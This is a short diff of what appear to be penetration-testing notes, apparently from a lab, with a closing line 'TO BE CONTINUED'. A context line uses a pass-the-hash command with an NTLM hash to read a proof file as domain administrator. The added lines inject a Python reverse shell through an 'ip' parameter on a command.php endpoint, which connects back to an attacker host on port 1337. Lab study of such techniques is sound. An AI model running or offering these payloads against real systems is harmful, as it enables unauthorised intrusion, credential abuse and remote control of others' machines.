@@ -8655,6 +8655,9 @@ Código console.py abaixo
 		proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f07696198910eb5aff8e92517ae6c46c" "xtr.local/administrator"@172.16.16.16 'type users\administrator\desktop\proof.txt.txt'
 
 
+## COMMANDS
+
+	curl -v -G 'http://192.168.161.254/command.php' --data-urlencode 'ip=127.0.0.1;export RHOST="192.168.161.20";export RPORT=1337;python3 -c '\''import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'\'''
 
 TO BE CONTINUED
 .
